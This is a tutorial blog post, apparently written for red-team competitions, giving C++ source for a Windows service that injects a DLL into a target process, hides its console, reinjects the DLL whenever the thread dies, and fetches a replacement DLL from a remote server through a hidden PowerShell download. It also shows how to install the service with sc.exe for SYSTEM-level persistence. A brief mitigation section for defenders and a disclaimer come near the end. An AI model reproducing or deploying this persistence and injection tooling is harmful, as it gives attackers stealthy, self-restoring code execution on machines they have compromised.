# Process Watchdog
*Writen by: Jon Bauer*

**For any bits of code missing through the post such as includes, visit the project github at:**
https://github.com/f1rehaz4rd/project link

## Disclaimer
**Do not use this code for any malicious purposes. This code was designed for a competition environment and has a purpose of teaching.**

## Where the idea came from 
DLL injection is a very popular tactic for hiding custom made DLLs as a thread inside another process. This is extremely useful for hiding code where it shouldn't be. There is nothing new about this, but I had a thought to take this a step further. 

This once the the injector is run, which I will briefly go over later, the remote thread for the process is started and left to do its thing. What happens when the system is restarted though? This can cause the process to be killed along with the thread that was we injected into it. 

This is where the idea that I had begun. I wanted to make the process persistent upon reboot. There are many differnt ways that you can make programs persist on reboot, but the way that I decided would be most effective for this was a service. This is where the decision was made to make a Windows service that not only did the injection, but then watched the thread to ensure that it would stay injected no matter what. 

## Summary of the Project
This project is a Windows service that interacts with the WINAPI functions directly inorder watch and mantain the state of the injected DLL. The logic of it is to inject the DLL and store the thread handler that the function returns. It then sleeps for a given amount of time before it checks if the thread is still created and in a running state. If it is not, then the service will reinject the DLL into the given set of processes. If the DLL happens to no longer be on the system, it will then pull it down from a file server to ensure persistence. 

## The Injection
I will be breifly going over the functions as a refresher to those who are familiar and teaching those who don't know about them. This will not be the focus of the post so there will not be extreme detail on them as you can find them here https://docs.microsoft.com/en-us/.

The functions need to be called in this order for them to work and also need to have a live process id in order to complete this action:
* OpenProcess()
* GetProcAddress()
* VirtualAllocEx()
* WriteProcessMemory()
* CreateRemoteThread()

To do the injection we are going to try to inject into the cmd.exe process with a high integerity level. We want to try to inject into a process with the highest level integerity that we can find. 

---insert picture 1 here---

We notice that it has a process ID of '2980' which we will be using to try to inject into. We will save this to a variable and then try to call OpenProcess(). We need to make sure that you are the same level or high then the process you are injecting into. It will look like this.

```
    int procID = 2980;
	// Opens the process with the target ID
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	if (process == NULL) {
		printf("\t[!] Error: Could not find or open process: %d\n", procID);
		return 0;
	}
    else {
		printf("\t[*] Sucessfully openned process with ID: %d\n", procID);
	}
```

Once we are sure that the process is open then we can run all the other commands which will inject our given DLL. I will not be going over what these commands do exactly, but Did write some error checking for them to help debug if anything went wrong. 

```
	// Gets the address to create the thread
	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (addr == NULL) {
		printf("\t[!] Error: Could not get the process address\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully obtained the process addr: %d\n", addr);
	}

	// Allocate memory for the process
	LPVOID arg = (LPVOID)VirtualAllocEx(process, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (arg == NULL) {
		printf("\t[!] Error: the memory could not be allocated inside the chosen process.\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully alloced memory: %d\n", arg);
	}

	// Write the process to memory
	int n = WriteProcessMemory(process, arg, dllPath, strlen(dllPath), NULL);
	if (n == 0) {
		printf("\t[!] Error: there was no bytes written to the process's address space.\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully wrote to process memory\n");
	}

	// Create the thread which starts the DLL
	HANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, NULL, NULL);
	if (threadID == NULL) {
		printf("\t[!] Error: the remote thread could not be created.\n");
		return 0;
	}
	else {
		printf("\t[+] Success, the remote thread was successfully created: %d\n", threadID);
	}
    
    CloseHandle(process);
```


## The Watching
So now the question is how do we watch it? We have to make sure that the program never ends by putting it in an infinite while-loop. For performance purposes we do need to put a bit of a sleep on it so that it isn't constantly checking. Plus if someone does end up finding it we don't want the thread to be spun up right away. We want to make them think it is gone before we start another one. For this article we will stick to one process, but you can make it choose from an array of processes at random. 

So how do we go about doing that. First we need to find out:
* How to find a process ID by name?
* How do we check if the DLL is running or not?
* How do we check if the DLL is still on the system?

These are all very important for health checks of the program. If one of these doesn't exist the service will not be as strong as it can be. 

### Finding the Process ID
---
If they close the process or restart it will have a different process ID but will always have the same name. For example, cmd.exe. How will this work? There are WINAPIs that will search through the processes running on the system that we can iterate through until we have a match for the name.

For good practice and easy of use I put this code in a function called FindProcessID, which takes in a variable of type const wstring. A wstring is just a special string that the WINAPI uses to interact with the system better. This function will then return a type DWORD which is another one of those fancy WINAPI variables that can be treated like an integer for our purposes.

We will be creating a new HANDLE with the CreateToolhelp32Snaphot() function (documentation on it here https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot). When passing it NULL we will get a large list of the processes that are running on the system. We will then use Process32First() to get the first process and check the name, and then Process32Next() in a while loop until we run out. This is going to allow use to visit each of the processes that are running on the system. For this example we will be using cmd.exe, but in use I would recommend a process that is always going to be running on the target system. 

If we find the target process, the functino will return the ID of it so that we can pass it into an inject function that we wrote above. If there is a chance that it doesn't find the ID it will return a 0.

```
DWORD FindProcessId(const std::wstring& processName) 
{
	// Sets up the ProcessEntry object and allocates the space for it
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	// Sets up the Handler and gets thhe processes
	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	// Checks the first process and checks if the name matches
	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile)) {
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	// Checks the rest of the processes and checks if their name matches
	while (Process32Next(processesSnapshot, &processInfo)) {
		if (!processName.compare(processInfo.szExeFile)) {
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	// Closes the handler
	CloseHandle(processesSnapshot);
	return 0;
}
```
### Checking the Thread
---
The injection is now covered along with a way to dynamically find processes IDs by name. Next step in the watchdog process is to verify that the process is still running after we have spun the thread up. 

To do this is actually quite simple. The CreateRemoteThread() function returns the thread handler, which conviently has all of the information that is needed to learn about the thread. Your injection function should return this HANDLE so that it can be used for this step of checking. 

There is a WINAPI function that you called WaitForSingleObject() which will return the current state of the HANDLE at the time it was called (more information about it here https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject). With this we can pass it the thread handler that we got from before and determine if it is still running or not. If the HANDLE returns a WAIT_OBJECT_0, then the thread is dead and we are going to have to start it back up again. otherwise it is in some other state, running or suspended. Part of the my research that I couldn't get working is how to check if the thread is actually suspended so if it is not dead, I resume it, which doesn't do anything if it is running, and then return that the thread is alive. 

```
DWORD IsAlive(HANDLE threadHandle)
{
	// Checks if the process is running or suspended
	DWORD result = WaitForSingleObject(threadHandle, 0);
	if (result == WAIT_OBJECT_0) {
		// the thread handle is signaled - the thread has terminated
		return 0;
	}
	else {
		// the thread handle is not signaled - the thread is still alive
		result = ResumeThread(threadHandle); // Resumes it incase it is suspended
		return 1;
	}
}
```

### Checking the System for the DLL
---
This is quite simple with C++. We just need to check if the file is on the system with a file stream. This is very easy to find, but I will also prove the code here as well. The tricky part is how to pull down the file if it isn't there? I do this in a very hacked together way with powershell. In the future I plan on doing this more programatically in order to pervent things like powershell being disabled or deleted from stopping the service from pulling the file down.

```
void checkDLL(const char* dllPath){
	// Checks if the dll is still on disk
	FILE* stream;
	if (fopen_s(&stream, dllPath, "r") != 0) {
		printf("\t[*] Dll is still on disk\n");
	}
	else {
		// Pull from CDN
		system("start powershell.exe -w 1 Invoke-WebRequest -Uri \"<URI to pull the file from>" -UseBasicParsing -OutFile C:\\<path and name to place the file>");
		printf("\t[!] Dll is no longer on disk pulling from <URI>\n");
	}
}
```

### Putting it all together
---
Now that all the parts are implemented in code we can put it all together to have an executatble that does the injection and watching for us. The first major barrier has been conquered and here is the final product. Here is the code of everything put together and some images of it loading the DLL.

```
int main()
{
	// Hides the Console Window 
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	// The path of the DLL to inject
	const char* dllPath = "C:\\<Path to DLL>";
	// Name of process to inject into
	std::wstring targetProcess= L"<Name of Process>";

	// Inject the initial dll
	printf("[*] Attempting to inject dll: %s\n", dllPath);
	HANDLE injected = InjectProcess(dllPath, targetProcess);
	if (injected == 0) {
		printf("[!] Error: Initial process failed to inject\n");
	}
	else {
		printf("[*] Initial process has been injected\n");
	}

	// The loop that watches everything
	while (1) {
		if (IsAlive(injected) == 0) {
			printf("[!] Process is no longer injected ... attempting to reinject\n");

			printf("\t[*] Checking if dll is still on disk\n");
			checkDLL(dllPath)

			printf("\t[*] Attempting to reinject the dll\n");
			injected = InjectProcess(dllPath, targetProcess);
			if (injected == 0) {
				printf("\t[!] Error: Process failed to reinject\n");
			}
			else {
				printf("\t[+] Process has been reinjected");
			}

		}
		else {
			printf("[*] Process is still alive and well\n");
		}
		Sleep(5000);
	}
	return 0;
}
```

--- INSERT PICTURE 2 OF PROCESS BEING INJECTED ---

## Turning it into a Service
Now that we have an executable that works we can start to build off of it. There are two benifits we are gaining by turning this into a service, but also a draw back. The pros of installing this program as a service is we gain persistence and SYSTEM level access. This allows our program to survive through reboots and be able to start a thread under just about any process on the system. To help mitigate this as a defender really learn what Windows Services shouldn't be there because an attacker will likely do everything that they can to stop you from finding this. 

The only real draw back of this is that you need Administrator privileges or you won't be able to install it. This is ment as a persistent mechanism once access is already gained. This tool was designed for the competition environment so it is assumed that Administrator creds are already provided to you. 

### Brief Summary on Services
---
This is a very high level summary so that when you read through the code on your own you have a better idea as of what is happening. There are some things that I do not completely understand myself but have learned through digging through the Mircosoft documentation that I have linked several times through the post.

Overall, for a service to start it needs to communcate with the SCM (Service Control Manager). In Windows this is the thing that controls everything that goes on. If you want to start the service to start you need to inform the SCM that you are in the starting state and wait for it to pass back to you. Same if you want to stop. You send to the SCM that you are going to stop and it will tell you that the service is good to stop.

I don't want to dig into the following code to much because it could be a whole post on its own, but to summarize what it does, it tells the SCM that we are starting a new service and runs the proper functions that will allow for us to start, stop, or suspend the service. Once it is done with that it starts up the PopupThread, which is the main thread for the service where we can put all of our old code into. Boom, now wer have a service that does the same thing as the executable. Installing a Windows Service is quite easy. This is just like doing it with any other but the most simple way to do it is:
```
sc.exe CREATE "<Service Name>" binpath="<Path to exe>"
```

```
DWORD WINAPI PopupThread(LPVOID lpParameter) {
	
	// This is now the main thread of the service
	// AKA the main where all your code wil be run

	return 0;
}

VOID ReportServiceStatus(DWORD CurrentState, DWORD Win32ExitCode, DWORD WaitHint) {
	static DWORD CheckPoint = 1;

	ServiceStatus.dwCurrentState = CurrentState;
	ServiceStatus.dwWin32ExitCode = Win32ExitCode;
	ServiceStatus.dwWaitHint = WaitHint;

	if (CurrentState == SERVICE_START_PENDING) {
		ServiceStatus.dwControlsAccepted = 0;
	}
	else {
		ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	}
	if ((CurrentState == SERVICE_RUNNING) ||
		(CurrentState == SERVICE_STOPPED))
		ServiceStatus.dwCheckPoint = 0;
	else ServiceStatus.dwCheckPoint = CheckPoint++;

	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}

VOID WINAPI ServiceControlHandler(DWORD Control) {
	switch (Control)
	{
	case SERVICE_CONTROL_STOP:
		ReportServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
		SetEvent(ServiceStopEvent);
		ReportServiceStatus(ServiceStatus.dwCurrentState, NO_ERROR, 0);
	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}
}

VOID ServiceWorker(DWORD Argc, LPTSTR* Argv) {
	ServiceStopEvent = CreateEvent(
		NULL,
		TRUE,
		FALSE,
		NULL
	);

	if (ServiceStopEvent == NULL) {
		ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

	DWORD ThreadID;
	HANDLE myHandle = CreateThread(0, 0, PopupThread, NULL, 0, &ThreadID);

	while (1) {
		WaitForSingleObject(ServiceStopEvent, INFINITE);
		ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}
}

VOID WINAPI ServiceMain(DWORD Argc, LPTSTR* Argv) {
	ServiceStatusHandle = RegisterServiceCtrlHandler(
		ServiceName,
		ServiceControlHandler
	);

	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwServiceSpecificExitCode = 0;

	ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	ServiceWorker(Argc, Argv);
}

int main()
{
	SERVICE_TABLE_ENTRY DispatchTable[] = {
		{(LPWSTR)ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
		{NULL, NULL}
	};
	StartServiceCtrlDispatcher(DispatchTable);
}
```

## Conclusion
We now have a really cleaver tool put together for some blue teamers to find in competition. This tool should give you persistence based on what you right for the injected DLL. My plan is to code a DLL which will give me a shell into the system. The real question is how to mitigate this as a blue teamer? 

## Mitigation
As a blue teamer some good tips to mitigate these attacks is really know your system. Use sysinternals to get a better look at what is running on you machine. Is there anything that looks out of place? Check time stamps on some of the DLLs in important places like C:\Windows directories. Anything that might being used will be newer.

Another way to stop this persistence attack at a high level is to use the firewall. A red teamer might have something like this running on your system, but if there are firewalls to stop it from going out then it might not matter because they can't talk out.

## Troubleshooting Tips
You might run into some issues that I didn't cover in the explaination above, but there are some of the issues that I ran into while developing this tool.

### Why isn't the thread spinning up even though I have all the code?
This could be for a couple reasons, but some of the ones you might want to check are as follows:
* You are running the exe as Administrator or only injecting into a process that is the same or lower integrity level as you.
* Make sure that both the process, DLL, and executable are all the same build format. For example, they should all be in x64 in my experience to play it save but there are definitely some processes that could handle x86.

### The DLL is injecting but none of my code is running?
* Make sure that you have a the switch case or DLLs being started as a thread in the DLL. This will be called DLLMain(), just do a quick Google search to find it.